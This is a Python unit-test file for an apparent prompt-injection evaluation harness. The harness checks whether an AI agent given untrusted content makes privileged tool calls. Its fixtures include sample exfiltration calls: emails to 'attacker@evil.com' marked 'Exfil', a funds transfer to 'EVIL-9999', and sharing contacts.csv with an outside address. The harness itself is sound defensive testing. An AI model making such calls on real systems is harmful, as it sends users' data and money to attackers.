"""Unit tests for detonate.py.

Tests cover the helper functions and trace logic WITHOUT loading any model.
The detonation loop itself is not tested here (requires the model); instead we
test the components that the loop depends on.
"""

import pytest
from detonate import (
    parse_tool_call,
    build_system_prompt,
    build_user_message,
    DetonationTrace,
    StepTrace,
)
from mock_tools import MockToolRegistry, PRIVILEGED_TOOL_NAMES


# ---------------------------------------------------------------------------
# parse_tool_call
# ---------------------------------------------------------------------------

class TestParseToolCall:
    def test_parses_xml_tagged_format(self):
        text = '<tool_call>{"name": "read_file", "arguments": {"path": "report.txt"}}</tool_call>'
        call, err = parse_tool_call(text)
        assert call is not None
        assert call["name"] == "read_file"
        assert call["arguments"]["path"] == "report.txt"
        assert err is None

    def test_parses_xml_with_surrounding_text(self):
        text = "I'll read the file now.\n<tool_call>{\"name\": \"read_file\", \"arguments\": {\"path\": \"x.txt\"}}</tool_call>\nDone."
        call, err = parse_tool_call(text)
        assert call is not None
        assert call["name"] == "read_file"

    def test_parses_send_email(self):
        text = '<tool_call>{"name": "send_email", "arguments": {"to": "evil@x.com", "subject": "data", "body": "stolen"}}</tool_call>'
        call, err = parse_tool_call(text)
        assert call is not None
        assert call["name"] == "send_email"
        assert call["arguments"]["to"] == "evil@x.com"

    def test_parses_transfer_funds(self):
        text = '<tool_call>{"name": "transfer_funds", "arguments": {"to_account": "99999", "amount": 1000}}</tool_call>'
        call, err = parse_tool_call(text)
        assert call is not None
        assert call["name"] == "transfer_funds"
        assert call["arguments"]["amount"] == 1000

    def test_no_tool_call_returns_none(self):
        text = "I can answer this directly without using any tools. The exchange rate is approximately 1.08."
        call, err = parse_tool_call(text)
        assert call is None
        assert err is None  # not a parse error — just no tool call present

    def test_malformed_json_returns_error(self):
        text = "<tool_call>{name: read_file, arguments: {path: oops}}</tool_call>"
        call, err = parse_tool_call(text)
        assert call is None
        assert err is not None  # JSON parse error reported

    def test_empty_string_returns_none(self):
        call, err = parse_tool_call("")
        assert call is None

    def test_bare_json_fallback(self):
        text = 'Sure, let me call this: {"name": "http_get", "arguments": {"url": "https://example.com"}}'
        call, err = parse_tool_call(text)
        # Bare JSON fallback may or may not trigger depending on exact format;
        # if it does trigger, name must be correct.
        if call is not None:
            assert call["name"] == "http_get"

    def test_privileged_tool_call_identified(self):
        text = '<tool_call>{"name": "transfer_funds", "arguments": {"to_account": "bad", "amount": 999}}</tool_call>'
        call, _ = parse_tool_call(text)
        assert call is not None
        assert call["name"] in PRIVILEGED_TOOL_NAMES

    def test_non_privileged_tool_call_identified(self):
        text = '<tool_call>{"name": "read_file", "arguments": {"path": "x.txt"}}</tool_call>'
        call, _ = parse_tool_call(text)
        assert call is not None
        assert call["name"] not in PRIVILEGED_TOOL_NAMES


# ---------------------------------------------------------------------------
# build_system_prompt
# ---------------------------------------------------------------------------

class TestBuildSystemPrompt:
    def test_includes_tool_names(self):
        prompt = build_system_prompt(["read_file", "send_email"])
        assert "read_file" in prompt
        assert "send_email" in prompt

    def test_marks_privileged_tools(self):
        prompt = build_system_prompt(["read_file", "transfer_funds"])
        # The privileged tool should be flagged
        assert "PRIVILEGED" in prompt
        # Non-privileged should NOT be flagged
        # (read_file line should not contain PRIVILEGED)
        lines = prompt.split("\n")
        read_lines = [l for l in lines if "read_file" in l]
        assert all("PRIVILEGED" not in l for l in read_lines)

    def test_includes_format_instruction(self):
        prompt = build_system_prompt(["read_file"])
        assert "<tool_call>" in prompt

    def test_excludes_unrequested_tools(self):
        prompt = build_system_prompt(["read_file"])
        assert "transfer_funds" not in prompt
        assert "send_email" not in prompt


# ---------------------------------------------------------------------------
# build_user_message
# ---------------------------------------------------------------------------

class TestBuildUserMessage:
    def test_plain_task(self):
        msg = build_user_message("Summarize the report.", None, None)
        assert msg == "Summarize the report."
        assert "external source" not in msg

    def test_with_untrusted_content(self):
        msg = build_user_message("Read this email.", "Evil content here", "customer_email")
        assert "Evil content here" in msg
        assert "customer_email" in msg

    def test_with_untrusted_content_default_source(self):
        msg = build_user_message("Read this.", "Some content", None)
        assert "external source" in msg
        assert "Some content" in msg


# ---------------------------------------------------------------------------
# Privilege detection in registry calls
# ---------------------------------------------------------------------------

class TestPrivilegeDetectionViaRegistry:
    """Tests that verify privileged actions are detectable after registry dispatch."""

    def test_privileged_action_detected_via_log(self):
        reg = MockToolRegistry()
        reg.send_email("attacker@evil.com", "Exfil", "Here are the contacts")
        log = reg.get_call_log()
        privileged_calls = [c for c in log if c.is_privileged]
        assert len(privileged_calls) == 1
        assert privileged_calls[0].tool_name == "send_email"

    def test_no_privileged_action_when_only_reads(self):
        reg = MockToolRegistry()
        reg.read_file("report.txt")
        reg.http_get("https://api.example.com")
        reg.db_query("SELECT 1")
        log = reg.get_call_log()
        privileged_calls = [c for c in log if c.is_privileged]
        assert len(privileged_calls) == 0

    def test_mixed_calls_only_privileged_flagged(self):
        reg = MockToolRegistry()
        reg.read_file("report.txt")       # not privileged
        reg.send_email("x@y.com", "s", "b")  # privileged
        reg.db_query("SELECT 1")          # not privileged
        reg.transfer_funds("acct", 50.0)  # privileged
        log = reg.get_call_log()
        priv = [c for c in log if c.is_privileged]
        non_priv = [c for c in log if not c.is_privileged]
        assert len(priv) == 2
        assert len(non_priv) == 2
        assert {c.tool_name for c in priv} == {"send_email", "transfer_funds"}

    def test_transfer_funds_arguments_captured(self):
        reg = MockToolRegistry()
        reg.transfer_funds("EVIL-9999", 9500.00, "USD")
        entry = reg.get_call_log()[0]
        assert entry.arguments["to_account"] == "EVIL-9999"
        assert entry.arguments["amount"] == 9500.00

    def test_share_file_arguments_captured(self):
        reg = MockToolRegistry()
        reg.share_file("contacts.csv", "adversary@external.net", "edit")
        entry = reg.get_call_log()[0]
        assert entry.arguments["path"] == "contacts.csv"
        assert entry.arguments["recipient"] == "adversary@external.net"
